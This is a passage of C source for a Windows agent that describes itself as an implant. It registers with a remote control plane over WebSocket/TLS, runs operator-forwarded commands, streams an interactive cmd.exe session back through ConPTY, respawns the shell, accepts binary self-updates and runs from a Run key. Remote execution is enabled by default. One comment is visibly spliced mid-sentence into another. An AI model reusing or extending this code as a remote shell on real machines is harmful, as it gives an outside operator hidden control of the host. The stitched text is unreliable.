        GetExitCodeProcess(pi.hProcess, &code);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

/* ------------------------------------------------------------------ */
/* Asynchronous command execution                                      */
/*                                                                   */
/* run_command() used to run on the main thread, which also owns the */
/* WebSocket. Any command slower than the control plane's 30 s ping   */
/* interval meant the agent stopped reading — and therefore stopped  */
/* answering pings — so the server dropped the socket, the result was */
/* lost, and the agent fell into its reconnect loop. The command now   */
/* runs on a worker thread; only the main thread ever touches the     */
/* socket, so no send lock is needed.                                 */
/* ------------------------------------------------------------------ */

typedef struct {
    char cmd[8192];
    char out[32768];
    char from[64];
    char id[64];
    int rc;
    HANDLE hThread;
    HANDLE hDone;       /* manual-reset event, signalled when `rc` is valid */
} async_cmd_t;

static async_cmd_t g_cmd;

/* Called once per main-loop iteration. Returns 1 when it sent a result. */
static int cmd_poll(void) {
    if (!g_cmd.hDone) return 0;
    if (WaitForSingleObject(g_cmd.hDone, 0) != WAIT_OBJECT_0) return 0;

    /* main-loop thread only: no locking needed */
    CloseHandle(g_cmd.hDone);
    g_cmd.hDone = NULL;
    if (g_cmd.hThread) { CloseHandle(g_cmd.hThread); g_cmd.hThread = NULL; }

    static char esc[66000];
    static char res[68000];
    json_escape(g_cmd.out, esc, sizeof(esc));
    snprintf(res, sizeof(res),
             "{\"type\":\"command-result\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":%d}",
             g_cmd.from, g_cmd.id, esc, g_cmd.rc);
    tr_send(res, (int)strlen(res));
    DBG("[command] done (rc=%d, %d bytes)\n", g_cmd.rc, (int)strlen(esc));
    g_cmd.id[0] = 0;
    return 1;
}

static DWORD WINAPI cmd_worker(LPVOID lp) {
    async_cmd_t *c = (async_cmd_t *)lp;
    c->rc = run_command(c->cmd, c->out, (int)sizeof(c->out));
    SetEvent(c->hDone);
    return 0;
}

/* Returns 0 on success. Refuses to start a second concurrent command because
   the reply buffer is single-slot. */
static int cmd_start(const char *from, const char *id, const char *cmd) {
    if (g_cmd.hDone) return -1;
    memset(&g_cmd, 0, sizeof(g_cmd));
    strncpy(g_cmd.cmd, cmd, sizeof(g_cmd.cmd) - 1);
    strncpy(g_cmd.from, from, sizeof(g_cmd.from) - 1);
    strncpy(g_cmd.id, id, sizeof(g_cmd.id) - 1);
    g_cmd.hDone = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_cmd.hDone) { g_cmd.hDone = NULL; return -1; }
    g_cmd.hThread = CreateThread(NULL, 0, cmd_worker, &g_cmd, 0, NULL);
    if (!g_cmd.hThread) { CloseHandle(g_cmd.hDone); g_cmd.hDone = NULL; return -1; }
    return 0;
}

/* Refuse a command with an immediate error result instead of queueing. */
static void cmd_busy_reply(const char *from, const char *id) {
    const char *err = "another command is still running on this peer";
    char esc[256];
    char res[512];
    json_escape(err, esc, sizeof(esc));
    snprintf(res, sizeof(res),
             "{\"type\":\"command-result\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":-1}",
             from, id, esc);
    tr_send(res, (int)strlen(res));
}

/* Send a terminal protocol frame back to the control plane. */
static int run_interactive(const char *to, const char *id);

static void term_send(const char *kind, const char *data, int len, int rc) {
    static char b64[44000];
    int need = ((len + 2) / 3) * 4 + 1;
    if (need > (int)sizeof(b64)) need = (int)sizeof(b64);
    int n = 0;
    if (len > 0) {
        int done = 0;
        while (done < len) {
            int c = len - done; if (c > 3072) c = 3072;
            char chunkb64[4100];
            int outi = 0;
            const unsigned char *p = (const unsigned char *)data + done;
            for (int i = 0; i + 2 < c; i += 3) {
                unsigned v = (p[i] << 16) | (p[i+1] << 8) | p[i+2];
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = t[(v>>6)&63]; chunkb64[outi++] = t[v&63];
            }
            int rem = c - (c/3)*3;
            if (rem == 1) {
                unsigned v = p[c-1] << 16;
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = '='; chunkb64[outi++] = '=';
            } else if (rem == 2) {
                unsigned v = (p[c-2] << 16) | (p[c-1] << 8);
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = t[(v>>6)&63]; chunkb64[outi++] = '=';
            }
            if (n + outi >= need - 1) outi = (need - 1) - n;
            memcpy(b64 + n, chunkb64, outi);
            n += outi;
            done += c;
        }
    }
    b64[n] = 0;

    char msg[45000];
    if (rc >= 0)
        snprintf(msg, sizeof(msg),
            "{\"type\":\"%s\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":%d}",
            kind, g_term.to, g_term.id, b64, rc);
    else
        snprintf(msg, sizeof(msg),
            "{\"type\":\"%s\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\"}",
            kind, g_term.to, g_term.id, b64);
    tr_send(msg, (int)strlen(msg));
}

/* Background thread: reads ConPTY output pipe and buffers it */
static DWORD WINAPI conpty_reader(LPVOID lp) {
    (void)lp;
    char buf[8192];
    DWORD nread = 0;
    while (g_term.active) {
        BOOL ok = ReadFile(g_term.hPipeIn, buf, sizeof(buf) - 1, &nread, NULL);
        if (!ok || nread == 0) break;
        EnterCriticalSection(&g_term.lock);
        int space = (int)sizeof(g_term.outbuf) - g_term.outlen;
        int cpy = (int)nread < space ? (int)nread : space;
        if (cpy > 0) {
            memcpy(g_term.outbuf + g_term.outlen, buf, cpy);
            g_term.outlen += cpy;
        }
        LeaveCriticalSection(&g_term.lock);
    }
    g_term.reader_exited = 1;
    return 0;
}

/* Write raw keystrokes directly into the ConPTY stdin pipe */
static void term_write_input(const char *data, int len) {
    if (!g_term.active || !data || len <= 0) return;
    if (g_term.hPipeOut == INVALID_HANDLE_VALUE) return;
    DWORD written = 0;
    BOOL ok = WriteFile(g_term.hPipeOut, data, (DWORD)len, &written, NULL);
    if (!ok) {
        /* Pipe broken — flag for restart */
        g_term.reader_exited = 1;
    }
}

static void term_stop_quiet(void) {
    if (!g_term.inited) return;
    g_term.active = 0;
    if (g_term.hProcess != INVALID_HANDLE_VALUE) {
        TerminateProcess(g_term.hProcess, 0);
        WaitForSingleObject(g_term.hProcess, 2000);
        CloseHandle(g_term.hProcess);
        g_term.hProcess = INVALID_HANDLE_VALUE;
    }
    if (g_term.hPC) { pClosePseudoConsole(g_term.hPC); g_term.hPC = NULL; }
    /* Order matters. The reader thread is parked in ReadFile on hPipeIn;
       closing that handle out from under it is a use-after-free. Cancel the
       pending read, let the thread leave ReadFile, join it, and only then
       close the handles. */
    if (g_term.hReaderThread != INVALID_HANDLE_VALUE) {
        CancelSynchronousIo(g_term.hReaderThread);
        WaitForSingleObject(g_term.hReaderThread, 2000);
        CloseHandle(g_term.hReaderThread);
        g_term.hReaderThread = INVALID_HANDLE_VALUE;
    }
    if (g_term.hPipeIn != INVALID_HANDLE_VALUE) { CloseHandle(g_term.hPipeIn); g_term.hPipeIn = INVALID_HANDLE_VALUE; }
    if (g_term.hPipeOut != INVALID_HANDLE_VALUE) { CloseHandle(g_term.hPipeOut); g_term.hPipeOut = INVALID_HANDLE_VALUE; }
    DeleteCriticalSection(&g_term.lock);
    g_term.inited = 0;
}

static void term_stop(void) {
    if (!g_term.inited && !g_term.active && !g_term.hPC) return;
    char saved_id[64] = {0};
    strncpy(saved_id, g_term.id, sizeof(saved_id) - 1);
    term_stop_quiet();
    if (saved_id[0]) term_send("term-end", "", 0, 0);
}

static int term_drain(void) {
    /* Detect child process exit and auto-restart */
    if (g_term.inited && g_term.active && g_term.reader_exited) {
        /* Clean up the dead ConPTY and restart */
        /* Zero-initialised: g_term.id is a 64-byte field, so strncpy of
           sizeof-1 leaves the terminator untouched only if it is already 0.
           A local with no initialiser makes an unterminated buffer here, and
           these are then handed to term_send() as C strings. */
        char saved_id[64] = {0}, saved_to[64] = {0};
        strncpy(saved_id, g_term.id, sizeof(saved_id) - 1);
        strncpy(saved_to, g_term.to, sizeof(saved_to) - 1);
        if (g_term.restarts >= TERM_MAX_RESPAWNS) {
            DBG("[term] shell exited and the respawn limit (%d) is reached — ending the session\n",
                TERM_MAX_RESPAWNS);
            term_stop();
            return 0;
        }
        /* run_interactive() memsets the session, so the count is carried
           across by hand. */
        int next = g_term.restarts + 1;
        term_stop_quiet();
        if (run_interactive(saved_to, saved_id) == 0) {
            g_term.restarts = next;
            DBG("[term] shell exited; respawned (%d/%d)\n", next, TERM_MAX_RESPAWNS);
        } else {
            /* run_interactive() has already zeroed the session, so there is
               no to/id to answer on. The viewer's socket watch is the signal
               that the session ended. */
            DBG("[term] respawn failed — ending the session\n");
        }
        return 0;
    }
    if (!g_term.inited || !g_term.id[0]) return 0;

    /* Drain in bounded chunks. outbuf holds 1 MB and the reader thread can
       fill most of it between two drains, so copying it wholesale into one
       fixed stack buffer overflowed the stack on any burst of shell output.
       The iteration cap keeps a large backlog from starving the socket read. */
    for (int chunks = 0; chunks < 8; chunks++) {
        char buf[8192];
        int cpy = 0;
        EnterCriticalSection(&g_term.lock);
        if (g_term.outlen > 0) {
            cpy = g_term.outlen < (int)sizeof(buf) ? g_term.outlen : (int)sizeof(buf);
            memcpy(buf, g_term.outbuf, cpy);
            memmove(g_term.outbuf, g_term.outbuf + cpy, g_term.outlen - cpy);
            g_term.outlen -= cpy;
        }
        LeaveCriticalSection(&g_term.lock);
        if (cpy <= 0) break;
        term_send("term-data", buf, cpy, -1);
    }
    return 0;
}

static int run_interactive(const char *to, const char *id) {
    /* Covers both a live session and a half-built one left by a failed start
       (whose critical section is still initialised but whose id must not
       survive into term_drain). */
    if (g_term.inited || g_term.active) term_stop_quiet();

    /* Check ConPTY availability */
    if (!conpty_init()) {
        DBG("[term] ConPTY not available on this system\n");
        return -1;
    }

    memset(&g_term, 0, sizeof(g_term));
    InitializeCriticalSection(&g_term.lock);
    g_term.inited = 1;
    g_term.hPipeIn = INVALID_HANDLE_VALUE;
    g_term.hPipeOut = INVALID_HANDLE_VALUE;
    g_term.hProcess = INVALID_HANDLE_VALUE;
    g_term.hReaderThread = INVALID_HANDLE_VALUE;

    strncpy(g_term.id, id, sizeof(g_term.id) - 1);
    strncpy(g_term.to, to, sizeof(g_term.to) - 1);

    /* Create two pipes:
       - pipeConPTYIn  (we write → ConPTY reads)  = stdin for the shell
       - pipeConPTYOut (ConPTY writes → we read)   = stdout for the shell */
    /* Deliberately no console is allocated or attached here. ConPTY needs
       only these two pipes — Microsoft's EchoCon sample allocates a console
       because it *renders* the session in a window, and this agent ships
       every byte to the operator instead. Allocating one was actively
       harmful: AllocConsole flashed a window on every terminal start, and
       the accompanying FreeConsole() detached the agent from whatever
       console it already had, so the local prompt's output went into a
       hidden buffer and the agent's own stdout broke when run from a
       terminal. */

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hPTYInRead = INVALID_HANDLE_VALUE, hPTYInWrite = INVALID_HANDLE_VALUE;
    HANDLE hPTYOutRead = INVALID_HANDLE_VALUE, hPTYOutWrite = INVALID_HANDLE_VALUE;

    if (!CreatePipe(&hPTYInRead, &hPTYInWrite, &sa, 65536) ||
        !CreatePipe(&hPTYOutRead, &hPTYOutWrite, &sa, 65536)) {
        DBG("[term] CreatePipe failed (%lu)\n", GetLastError());
        if (hPTYInRead != INVALID_HANDLE_VALUE) CloseHandle(hPTYInRead);
        if (hPTYInWrite != INVALID_HANDLE_VALUE) CloseHandle(hPTYInWrite);
        if (hPTYOutRead != INVALID_HANDLE_VALUE) CloseHandle(hPTYOutRead);
        if (hPTYOutWrite != INVALID_HANDLE_VALUE) CloseHandle(hPTYOutWrite);
        term_stop_quiet(); /* also clears `inited`, so term_drain bails out */
        return -1;
    }

    /* Create the pseudo console */
    COORD size = { 120, 40 };
    void *hPC = NULL;
    HRESULT hr = pCreatePseudoConsole(size, hPTYInRead, hPTYOutWrite, 0, &hPC);
    if (FAILED(hr)) {
        DBG("[term] CreatePseudoConsole failed (hr=0x%lx, err=%lu)\n", hr, GetLastError());
        CloseHandle(hPTYInRead); CloseHandle(hPTYInWrite);
        CloseHandle(hPTYOutRead); CloseHandle(hPTYOutWrite);
        term_stop_quiet();
        return -1;
    }

    /* Close the ConPTY-facing ends (ConHost holds its own copies) */
    CloseHandle(hPTYInRead);
    CloseHandle(hPTYOutWrite);

    /* Save our ends */
    g_term.hPC = hPC;
    g_term.hPipeOut = hPTYInWrite;   /* we write here → shell stdin */
    g_term.hPipeIn = hPTYOutRead;     /* we read here ← shell stdout */

    /* Set up STARTUPINFOEX with the ConPTY handle */
    STARTUPINFOEXW sie = {0};
    sie.StartupInfo.cb = sizeof(sie);
    SIZE_T attrListSize = 0;
    pInitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)calloc(attrListSize, 1);
    if (!sie.lpAttributeList ||
        !pInitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &attrListSize) ||
        !pUpdateProcThreadAttribute(sie.lpAttributeList, 0,
            PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hPC, sizeof(HPCON), NULL, NULL)) {
        DBG("[term] ProcThreadAttribute setup failed (%lu)\n", GetLastError());
        if (sie.lpAttributeList) { pDeleteProcThreadAttributeList(sie.lpAttributeList); free(sie.lpAttributeList); }
        term_stop_quiet();
        return -1;
    }

    /* Launch cmd.exe attached to the ConPTY */
    PROCESS_INFORMATION pi = {0};
    wchar_t cmdline[] = L"cmd.exe";
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
            EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
            &sie.StartupInfo, &pi)) {
        DBG("[term] CreateProcess failed (%lu)\n", GetLastError());
        pDeleteProcThreadAttributeList(sie.lpAttributeList);
        free(sie.lpAttributeList);
        term_stop_quiet();
        return -1;
    }

    g_term.hProcess = pi.hProcess;
    CloseHandle(pi.hThread);

    /* Cleanup attribute list */
    pDeleteProcThreadAttributeList(sie.lpAttributeList);
    free(sie.lpAttributeList);

    g_term.active = 1;

    /* Start background reader thread */
    g_term.hReaderThread = CreateThread(NULL, 0, conpty_reader, NULL, 0, NULL);

    return 0;
}

/* ------------------------------------------------------------------ */
/* Local prompt — the agent doubles as a controller                    */
/*                                                                    */
/* The stdin thread used to be created and destroyed inside every      */
/* session, and teardown called fclose(stdin) on a process-wide       */
/* handle. After the first disconnect stdin was permanently closed,    */
/* so the prompt started on the next connection died on its first      */
/* Handshake state, main thread only. Reset at the top of every connection
   attempt: a stale challenge from a previous socket must never be able to
   answer a challenge on this one. */
static BYTE g_challenge[32];
static int  g_challenge_len;
static char g_implant_id[64];

/* The stdin thread only parses and prints. It used to park a request for the
   main loop to forward to another peer, but the control plane now refuses
   device-originated traffic, so that path is gone: the prompt is read-only
   and every command is issued from the control plane. */
/* ------------------------------------------------------------------ */
static DWORD WINAPI reader_thread(LPVOID lp) {
    (void)lp;
    char line[8192];
    /* No console means no prompt. A Run-key launch has no interactive stdin,
       so there is nobody to type at it — return before announcing a prompt
       that cannot be used. */
    if (!has_console()) return 0;
    printf("local prompt ready\n");
    while (fgets(line, sizeof(line), stdin)) {
        char *nl = strchr(line, '\n'); if (nl) *nl = 0;
        nl = strchr(line, '\r'); if (nl) *nl = 0;
        if (!line[0]) continue;

        if (strcmp(line, "exit") == 0 || strcmp(line, "quit") == 0) {
            printf("exiting\n");
            break;
        }
        if (strcmp(line, "help") == 0 || strcmp(line, "?") == 0) {
            printf(
                "commands:\n"
                "  list                      show peers from the last map update\n"
                "  help                      this text\n"
                "  exit                      quit the agent\n"
                "\n"
                "commands and terminals are issued from the control plane, not\n"
                "from here: the server refuses to relay a peer's traffic to any\n"
                "other peer. Use forzerctl or the dashboard against this host.\n");
            continue;
        }
        if (strcmp(line, "list") == 0 || strcmp(line, "id") == 0) {
            /* There is no peer list any more: this agent is a target, not
               a peer. It can only speak about itself. */
            printf("implant id   : %s\n", g_implant_id[0] ? g_implant_id : "(not authenticated)");
            /* The shared secret is deliberately not printable here. It used to
               show the public point, which was public by construction; there is
               no public half of a PSK to show. */
            printf("identity     : shared secret in %s (not printable)\n", "identity.key");
            continue;
        }
        if (strncmp(line, "run", 3) == 0 && (line[3] == 0 || line[3] == ' ')) {
            printf(
                "'run' was removed. This agent only executes commands that the\n"
                "control plane forwards from an authenticated operator, so a\n"
                "command typed here would have nowhere to go. Use the dashboard\n"
                "or forzerctl against the control plane instead.\n");
            continue;
        }
        printf("unknown command; type 'help'\n");
    }
    return 0;
}

/* local_poll() used to live here. It shipped {"type":"command","to":<peer>}
   from this agent's own prompt, and the server used to relay it to that peer
   — which made every agent a command source for every other agent. The
   server no longer routes device-originated traffic to a peer, so the code
   went with it rather than being left as a branch that always fails.

   It was also a second writer on one socket: the stdin thread called
   tr_send() while the main thread was emitting command results and terminal
   output, which interleaves bytes and corrupts the WebSocket stream. The
   stdin thread is now print-only. */


/* Decode standard padded base64 into out, stopping at cap. Returns bytes
   written, or -1 if the input is not valid base64. */
static int b64_decode(const char *in, BYTE *out, int cap) {
    static const char *T =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int dl = (int)strlen(in), o = 0;
    if (dl % 4) return -1;
    for (int i = 0; i < dl; i += 4) {
        int val[4];
        for (int k = 0; k < 4; k++) {
            char c = in[i + k];
            if (c == '=' && k >= 2) { val[k] = 0; continue; }
            const char *p = (c ? strchr(T, c) : NULL);
            if (!p) return -1;
            val[k] = (int)(p - T);
        }
        unsigned trip = ((unsigned)val[0] << 18) | ((unsigned)val[1] << 12) |
                        ((unsigned)val[2] << 6) | (unsigned)val[3];
        if (o < cap) out[o++] = (BYTE)(trip >> 16);
        if (in[i + 2] != '=' && o < cap) out[o++] = (BYTE)(trip >> 8);
        if (in[i + 3] != '=' && o < cap) out[o++] = (BYTE)trip;
    }
    return o;
}

/* One connection attempt: connect, handshake, register, then pump until the
   link drops.

   Returns 0 to exit cleanly, 1 on a permanent failure, 2 when the caller
   should back off and try again.

   Anything that can plausibly be a bad moment — DNS, a refused connection, a
   TLS hiccup, a server restart caught mid-upgrade, or a profile that has not
   finished unlocking at logon so DPAPI cannot open the identity yet — returns
   2. It used to return 1, which ended the process: under a Run key there is no
   console to complain on and no one to relaunch it, so a single network blip
   left the box dark until the next logon. Only a genuinely permanent fault
   (an unusable URL, no entropy) still exits. */
static int session_run(const char *url, const char *name) {
    g_challenge_len = 0;
    g_implant_id[0] = 0;
    const char *ar = getenv("FORZER_ALLOW_REMOTE");
    g_allow_remote = (ar == NULL || strcmp(ar, "0") != 0) ? 1 : 0;
    if (g_allow_remote)
        DBG("WARNING: remote command execution is ENABLED on this host.\n");

    /* Bounded per-command runtime. Read once per session rather than per
       command, so it cannot change under a command that is already running. */
    g_exec_timeout_ms = env_int("FORZER_EXEC_TIMEOUT_MS", 300000, 0, 86400000);
    DBG("command timeout: %d ms%s\n", g_exec_timeout_ms,
        g_exec_timeout_ms ? "" : " (disabled)");

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        DBG("error: WSAStartup failed\n");
        return 1;
    }

    int is_wss = (strncmp(url, "wss://", 6) == 0);
    if (!is_wss && strncmp(url, "ws://", 5) != 0) {
        DBG("error: only ws:// and wss:// supported\n");
        session_teardown();
        return 1;
    }
    const char *auth = url + (is_wss ? 6 : 5);

    char host[256] = {0}, path[512] = {0};
    const char *slash = strchr(auth, '/');
    const char *colon = strchr(auth, ':');
    int port = is_wss ? 443 : 80;
    if (colon && (!slash || colon < slash)) {
        int hl = (int)(colon - auth);
        if (hl >= (int)sizeof(host)) hl = (int)sizeof(host) - 1;
        memcpy(host, auth, hl);
        port = atoi(colon + 1);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= (int)sizeof(path)) pl = (int)sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    } else {
        int hl = slash ? (int)(slash - auth) : (int)strlen(auth);
        if (hl >= (int)sizeof(host)) hl = (int)sizeof(host) - 1;
        memcpy(host, auth, hl);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= (int)sizeof(path)) pl = (int)sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    }
    if (path[0] == 0) path[0] = '/';

    DBG("connecting to %s:%d%s (%s)\n", host, port, path, is_wss ? "wss" : "ws");

    if (is_wss) {
        if (tls_handshake(host, port) != 0) {
            DBG("error: tls handshake failed\n");
            session_teardown();
            return 2; /* transient: back off and retry */
        }
    } else {
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portstr[16];
        snprintf(portstr, sizeof(portstr), "%d", port);
        if (getaddrinfo(host, portstr, &hints, &res) != 0) {
            DBG("error: cannot resolve %s\n", host);
            session_teardown();
            return 2; /* transient: back off and retry */
        }
        SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s == INVALID_SOCKET) {
            DBG("error: socket() failed\n");
            freeaddrinfo(res);
            session_teardown();
            return 2; /* transient: back off and retry */
        }
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
            DBG("error: connect() failed (%d)\n", WSAGetLastError());
            closesocket(s);
            freeaddrinfo(res);
            session_teardown();
            return 2; /* transient: back off and retry */
        }
        freeaddrinfo(res);
        g_sock = s;
    }

    /* --- WebSocket HTTP upgrade (shared by ws and wss) --- */
    BYTE keyb[16];
    if (!rng_bytes(keyb, 16)) {
        DBG("error: no entropy available\n");
        session_teardown();
        return 1;
    }
    char keyb64[32];
    base64(keyb, 16, keyb64);
    char req[2048];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
             "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
             "Sec-WebSocket-Version: 13\r\n\r\n",
             path, host, port, keyb64);
    if (g_use_tls) {
        if (!tls_send(req, (int)strlen(req))) {
            DBG("error: handshake send failed\n");
            session_teardown();
            return 2; /* transient: back off and retry */
        }
    } else {
        if (!sock_send_all(g_sock, req, (int)strlen(req))) {
            DBG("error: handshake send failed\n");
            session_teardown();
            return 2; /* transient: back off and retry */
        }
    }

    char resp[1024];
    int rl = 0, r;
    while (rl < (int)sizeof(resp) - 1) {
        r = g_use_tls ? tls_recv(resp + rl, 1) : recv(g_sock, resp + rl, 1, 0);
        if (r <= 0) break;
        rl += r;
        if (rl >= 4 && resp[rl - 4] == '\r' && resp[rl - 3] == '\n' &&
            resp[rl - 2] == '\r' && resp[rl - 1] == '\n')
            break;
    }
    resp[rl] = 0;
    if (strstr(resp, "101") == NULL) {
        DBG("error: handshake failed:\n%s\n", resp);
        session_teardown();
        return 2; /* transient: back off and retry */
    }
    g_ws_up = 1;
    char *acc = strstr(resp, "sec-websocket-accept:");
    if (acc) {
        acc = strchr(acc, ':') + 1;
        while (*acc == ' ') acc++;
        char server_acc[128] = {0};
        int i = 0;
        while (*acc && *acc != '\r' && *acc != '\n' && i < 127) server_acc[i++] = *acc++;
        char concat[96];
        snprintf(concat, sizeof(concat), "%s%s", keyb64, WS_GUID);
        BYTE hash[20];
        sha1((BYTE *)concat, (DWORD)strlen(concat), hash);
        char expect[64];
        base64(hash, 20, expect);
        if (_stricmp(server_acc, expect) != 0) {
            /* A wrong Sec-WebSocket-Accept means the endpoint did not read our
               handshake, so it is not the WebSocket server it claims to be.
               This was a warning that carried on regardless. */
            DBG("error: server accept mismatch — refusing this endpoint\n");
            session_teardown();
            return 2; /* transient: back off and retry */
        }
    }

    DBG("websocket connected\n");

    /* Identity first: the secret below has to be the one this install has held
       since first run, not a fresh random value per connection. */
    BYTE *id_secret = NULL;
    DWORD id_secret_len = 0;
    int idrc = identity_load(&id_secret, &id_secret_len);
    if (idrc != 1) {
        DBG("error: no usable identity\n");
        session_teardown();
        /* 2 means "retry later" and 3 is not that, so connect_mode returns it
           and the process exits instead of looping against a control plane it
           can never authenticate to. identity_load already said why. */
        return idrc == 2 ? 3 : 2;
    }
    DBG("identity loaded (shared secret on disk)\n");
    char sec_b64[128];
    base64(id_secret, NG_SECRET_BYTES, sec_b64);

    /* The secret is sent once, at enrolment, over the pinned TLS channel. That
       is the one asymmetry against the old design, where only a public point
       ever left the host; it is bounded by the same guarantee everything else
       in the handshake rests on. */
    char reg[768];
    char ops_list[256];
    ops_json(ops_list, sizeof(ops_list));
    snprintf(reg, sizeof(reg),
             "{\"type\":\"register\",\"name\":\"%s\",\"secret\":\"%s\","
             "\"proto\":%d,\"ops\":[%s]}",
             name && *name ? name : "forzer", sec_b64,
             FORZER_PROTO, ops_list);
    if (tr_send(reg, (int)strlen(reg)) <= 0) {
        DBG("error: register send failed\n");
        SecureZeroMemory(id_secret, id_secret_len);
        free(id_secret);
        session_teardown();
        return 2; /* transient: back off and retry */
    }
    DBG("sent register; waiting for challenge...\n");

    char buf[131072];
    int reconnect = 0;
    /* Poll the socket so the main loop wakes often enough to flush buffered
       terminal output even when the server is idle (no inbound frames). A
       purely blocking recv would stall the live terminal for up to 30s until
       the next server ping arrived. */
    WSAPOLLFD pfd;
    pfd.fd = g_sock;
    pfd.events = POLLRDNORM;
    pfd.revents = 0;
    for (;;) {
        int n = 0;
        /* Wake often only when there is something to push. With no terminal
           and no command in flight the loop has no work to do between frames,
           and the server's 30 s ping is what keeps the link honest — so an
           idle box now sleeps on that ping instead of waking twenty times a
           second for the life of the install. */
        int busy = (g_term.inited || g_cmd.hDone);
        pfd.revents = 0;
        int pr = WSAPoll(&pfd, 1, busy ? 50 : 5000);
        int is_bin = 0;
        if (pr > 0 && (pfd.revents & (POLLRDNORM | POLLRDBAND))) {
            n = tr_recv(buf, sizeof(buf) - 1, &is_bin);
            if (n < 0) {
                DBG("connection closed\n");
                reconnect = 1;
                break;
            }
        } else if (pr < 0) {
            if (WSAGetLastError() == WSAEINTR) continue;
            DBG("connection closed (poll)\n");
            reconnect = 1;
            break;
        }
        term_drain(); /* pump any buffered terminal output (main thread owns socket) */
        cmd_poll();   /* ship a finished command result without blocking the loop */
        if (n > 0 && is_bin) {
            /* A binary frame is payload, not a control message: the next
               announced `update` is what it belongs to. */
            unsigned char *blob = NULL;
            int blen = 0;
            ws_bin_take(&blob, &blen);
            if (blob) {
                DBG("[update] binary message of %d bytes\n", blen);
                update_blob(blob, blen);
                free(blob);
            }
            continue;
        }
        if (n > 0) {
            buf[n] = 0;
        char type[32] = {0};
        json_str(buf, "type", type, sizeof(type));
        char from[64] = {0};
        json_str(buf, "from", from, sizeof(from));
        /* Commands are server-authoritative. The control plane refuses to
           relay anything a device originates, so `from` should always be
           "viewer:<id>" on anything that asks this host to act. Check it
           anyway: a strncmp here means a future protocol change cannot
           quietly reopen the peer-to-peer path from this side, and an agent
           talking to a hostile or spoofed server still refuses to be driven
           by anything but an authenticated operator. */
        int from_viewer = (strncmp(from, "viewer:", 7) == 0 && from[7] != 0);
        if (strcmp(type, "registered") == 0) {
            char id[64] = {0}, err[128] = {0}, sproof[256] = {0};
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "error", err, sizeof(err));
            json_str(buf, "serverProof", sproof, sizeof(sproof));
            if (err[0]) { INFO( "register error: %s\n", err); break; }

            /* Verify the control plane. It proved possession of the same key it
               sent in the challenge, under a different label, so this is what
               stops an agent from taking orders from a substituted endpoint.
               Skipping it would leave the mutual half decorative. */
            if (g_challenge_len != NG_SECRET_BYTES) {
                INFO( "error: a 'registered' arrived with no challenge answered\n");
                break;
            }
            BYTE want[NG_PROOF_BYTES], got[NG_PROOF_BYTES];
            if (!ng_proof(id_secret, NG_LABEL_SERVER, g_challenge,
                          NG_SECRET_BYTES, want)) {
                INFO( "error: could not compute the expected server proof\n");
                break;
            }
            int glen = b64_decode(sproof, got, NG_PROOF_BYTES);
            if (glen != NG_PROOF_BYTES || !ng_equal(want, got, NG_PROOF_BYTES)) {
                INFO(
                        "error: control plane failed authentication — refusing to take commands.\n"
                        "  It did not prove possession of the key it advertised.\n");
                break;
            }
            DBG("authenticated: implant id=%s\n", id);
            g_implant_id[0] = 0;
            strncpy(g_implant_id, id, sizeof(g_implant_id) - 1);
            SecureZeroMemory(id_secret, id_secret_len);
            free(id_secret);
            id_secret = NULL;
        } else if (strcmp(type, "challenge") == 0) {
            char nonce_b64[256] = {0};
            json_str(buf, "nonce", nonce_b64, sizeof(nonce_b64));

            int nlen = b64_decode(nonce_b64, g_challenge, (int)sizeof(g_challenge));
            if (nlen != NG_SECRET_BYTES) {
                INFO( "error: server sent a %d-byte challenge, expected %d\n",
                        nlen, NG_SECRET_BYTES);
                break;
            }
            /* No key agreement and no peer key to check: both proofs are made
               from the secret both sides enrolled with, so anything that
               cannot produce it is not the control plane. That is the whole
               server-authentication story, and it needs no stored pin. */
            g_challenge_len = nlen;
            BYTE proof[NG_PROOF_BYTES];
            if (!ng_proof(id_secret, NG_LABEL_CLIENT, g_challenge,
                          NG_SECRET_BYTES, proof)) {
                INFO( "error: could not compute the client proof\n");
                break;
            }
            char proof_b64[128];
            base64(proof, NG_PROOF_BYTES, proof_b64);
            char auth[256];
